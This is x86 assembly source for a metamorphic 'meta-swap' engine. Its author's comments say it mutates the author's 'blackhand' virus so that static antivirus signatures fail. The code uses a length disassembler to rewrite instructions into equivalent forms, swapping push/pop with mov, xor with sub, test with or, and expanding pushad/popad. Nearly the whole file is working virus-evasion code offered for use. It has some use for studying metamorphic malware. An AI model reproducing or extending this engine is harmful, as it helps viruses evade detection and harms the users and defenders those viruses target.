; meta-swap engine, lame but it works and will fuck up static signatures
; It can handle simple 1/2 bytes long opcodes
; push/pop <-> mov 
; xor reg/reg <-> xsub reg,reg
; test <-> or after call instruction (assumes that return value is checked) 
; Yo make string's on stack simple use z0mbies x_push/x_pop macros... so you don't have 
; to worry about getting weird instruction. 
; This piece of code is gona mutate my blackhand virus, and it is simple, lame, easy to understantd
; whew, don't flame me it you don't like my code :( I'm just tryng to make my viri look perfect :)
; Also in viri should be used macros for @losd and @stosd and also @pushad/@popad
; so they can be meta-swaped with other instructions...
;
; Coded by deroko <deroko<at>gmail<dot>com>
;                 http://drop.to/deroko
mutation:
meta_swap_engine:
meta_start           equ    dword ptr[ebp+8]
meta_size            equ    dword ptr[ebp+0ch]
                     push   ebp
                     mov    ebp, esp
                     @pushad
                     mov    edx, meta_size
                     add    edx, meta_start
                     add    edx, __end_mutation-mutation
                     mov    ebx, meta_start
                     xor    eax, eax
                     xor    ecx, ecx
__lde_starts:
                     cmp    edx, ebx
                     jb     __done
                     call   mlde32, ebx
                     cmp    eax, -1
                     je     __done
                     cmp    eax, 2
                     ja     __@@1
                     call   meta_swap, ebx, ecx
__@@1:                                                
                     mov    ecx, eax
                     add    ebx, eax
                     jmp    __lde_starts
__done:
                     @popad
                     mov    esp, ebp
                     pop    ebp
                     ret    8
                     
meta_swap: 
instr                equ    dword ptr[ebp+8]
previnstr            equ    dword ptr[ebp+0ch]
                     push   ebp
                     mov    ebp, esp
                     @pushad                                    ;save registers
                     mov    esi, instr
                     mov    edi, esi
                     mov    ecx, previnstr
                     ;My random instruction swap comes like this ebx still has pointer to opcode
                     ;so check if bl is less or greater of some number eg. B0h if is lower than this
                     ;mutate, otherwise not
                     mov    ebx, esi
                     cmp    bl, 0B0h
                     ja     __exit_meta_swap
                     xor    eax, eax
                     xor    edx, edx
                     xor    ebx, ebx
                     @lodsd                                     ;here comes meta lodsd folowed
                                                                ;by 5 nopes =)
                     cmp    eax, pushadopcode
                     je     __pushad_to_push
                     cmp    eax, popadopcode                    
                     je     __popad_to_pop
                     cmp    eax, push1st
                     je     __push_to_pushad
                     cmp    eax, pop1st
                     je     __pop_to_popad                                           
                     cmp    ax, movedieax                         ;is it mov [edi], eax or mov eax, [esi]?
                     je     __check_eax_edi_esi
                     cmp    ax, moveaxesi
                     je     __check_eax_edi_esi
                     mov    dx, ax
                     and    dh, 11111000b                       ;if it is pop erase reg
                     and    dl, 11111000b                       ;Erase reg if push or dw if mov
                     cmp    dl, movopcode
                     je     __mov_to_push_pop
                     cmp    dl, pushopcode
                     je     __push_pop_to_mov
                     cmp    dl, subopcode
                     je     __sub_to_xor
                     cmp    dl, xoropcode
                     je     __xor_to_sub
                     cmp    dl, oropcode
                     je     __test_or_or
                     cmp    al, testopcode
                     je     __test_or_or
                     cmp    al, lodsdopcode
                     je     __lodsd_to_mov
                     cmp    al, stosdopcode
                     je     __stosd_to_mov
                     jmp    __exit_meta_swap
__push_pop_to_mov:
                     cmp    dh, popopcode                       ;is pushreg folowed by popreg
                     jne    __exit_meta_swap                ;nope...
                     mov    bx, ax
                     and    bl, 00000111b                       ;bl push reg
                     and    bh, 00000111b                       ;bh pop reg
                     mov    al, mov12
                     mov    ah, mod                            ;mov reg reg
                     shl    bl, 3                               
                     add    ah, bl
                     add    ah, bh
                     stosw
                     jmp    __exit_meta_swap_2suc
__sub_to_xor:
                     mov    dh, ah
                     mov    dl, ah
                     and    dh, 000000111b
                     and    dl, 000111000b
                     shr    dl, 3
                     cmp    dh, dl
                     jne    __exit_meta_swap
                     mov    al, xoropcode
                     add    al, dwset
                     mov    ah, mod
                     shl    dl, 3
                     add    ah, dl
                     add    ah, dh
                     stosw
                     jmp    __exit_meta_swap_2suc
__xor_to_sub:
                     mov    dh, ah
                     mov    dl, ah
                     and    dh, 000000111b
                     and    dl, 000111000b
                     shr    dl, 3
                     cmp    dh, dl
                     jne    __exit_meta_swap
                     mov    al, subopcode
                     add    al, dwset
                     mov    ah, mod
                     shl    dl, 3
                     add    ah, dl
                     add    ah, dh
                     stosw
                     jmp    __exit_meta_swap_2suc
__mov_to_push_pop:
                     test   al, 00000001b                       ;tes for w
                     jz     __exit_meta_swap
                     mov    dh, ah
                     and    dh, 11000000b
                     cmp    dh, 11000000b
                     jne     __exit_meta_swap                    ;check if it is reg reg
                     mov    dh, ah
                     mov    dl, ah
                     and    dl, 00000111b                       ;dl 2nd reg
                     and    dh, 00111000b                       ;dh 1st reg
                     shr    dh, 3
                     test   al, direction
                     jnz    __mov_d_bit_set
                     mov    al, pushopcode
                     mov    ah, popopcode
                     add    al, dh
                     add    ah, dl
                     stosw
                     jmp    __exit_meta_swap_2suc
__mov_d_bit_set:                    
                     mov    al, pushopcode
                     mov    ah, popopcode
                     add    al, dl
                     add    ah, dh
                     stosw
                     jmp    __exit_meta_swap_2suc

__test_or_or:
                     ;this part of code will change test for or after any call
                     ;1st check if test/or are after call
                     sub    esi, 4
                     sub    esi, ecx
                     cmp    byte ptr[esi], calldirect
                     je     __check_for_test_or
                     cmp    byte ptr[esi], callindirect
                     je     __check_for_test_or
                     jmp    __exit_meta_swap
                     ;now lets see if it is or or test
                     ;first chek if is reg to reg 
__check_for_test_or:
                     test   ah, mod
                     jz     __exit_meta_swap
                     cmp    al, testopcode
                     je     __test_to_or
                     cmp    dl, oropcode
                     je     __or_to_test

__test_to_or:
                     mov    al, oropcode
                     or     al, 00000001b ;set w bit, d who cares, same regs anyway
                     stosw
                     jmp    __exit_meta_swap_2suc
__or_to_test:
                     mov    al, testopcode
                     or     al, 00000001b ;set w bit
                     stosw
                     jmp    __exit_meta_swap_2suc
__check_eax_edi_esi:
                     cmp    ax, movedieax
                     je     __change_to_stosd
                     cmp    ax, moveaxesi
                     je     __change_to_lodsd
                     jmp    __exit_meta_swap
__change_to_stosd:
                     mov    al, stosdopcode              ;make stosb
                     stosb
                     mov    eax, 90909090h               
                     @stosd                                                                   
                     stosb                               ;make five pushes
                     mov    [esp.Pushad_eax], 6          
                     jmp    __exit_meta_swap
__change_to_lodsd:
                     mov    al, lodsdopcode
                     stosb
                     mov    eax, 90909090h
                     @stosd
                     stosb
                     mov    [esp.Pushad_eax], 6
                     jmp    __exit_meta_swap
__stosd_to_mov:
                     mov    ax, movedieax
                     stosw
                     mov    eax, addedi4
                     @stosd
                     mov    [esp.Pushad_eax], 6
                     jmp    __exit_meta_swap
__lodsd_to_mov:
                     mov    ax,moveaxesi
                     stosw
                     mov    eax, addesi4
                     @stosd 
                     mov    [esp.Pushad_eax], 6
                     jmp    __exit_meta_swap
__push_to_pushad:
                     cmp    dword ptr[esi], push2nd
                     jne    __exit_meta_swap
                     mov    eax, pushadopcode
                     @stosd
                     mov    eax, 90909090h
                     @stosd
                     @stosd
                     @stosd
                     mov    [esp.Pushad_eax],16
                     jmp    __exit_meta_swap
__pushad_to_push:
                     mov    eax, push1st
                     @stosd
                     mov    eax, push2nd
                     @stosd
                     mov    eax, addesp1st
                     @stosd
                     mov    eax, addesp2nd
                     @stosd
                     mov    [esp.Pushad_eax],16
                     jmp    __exit_meta_swap
__pop_to_popad:
                     cmp    dword ptr[esi], pop2nd
                     jne    __exit_meta_swap
                     mov    eax, popadopcode
                     @stosd
                     mov    eax, 90909090h
                     @stosd
                     mov    [esp.Pushad_eax],8
                     jmp    __exit_meta_swap
__popad_to_pop:
                     mov    eax, pop1st
                     @stosd
                     mov    eax, pop2nd
                     @stosd
                     mov    [esp.Pushad_eax],8
                     jmp    __exit_meta_swap
                                                                                                            
__exit_meta_swap_2suc:
                     mov    [esp.Pushad_eax], 2                   
__exit_meta_swap:
                     @popad
                     mov    esp, ebp
                     pop    ebp
                     ret    8
__end_mutation:

include              mlde32.asm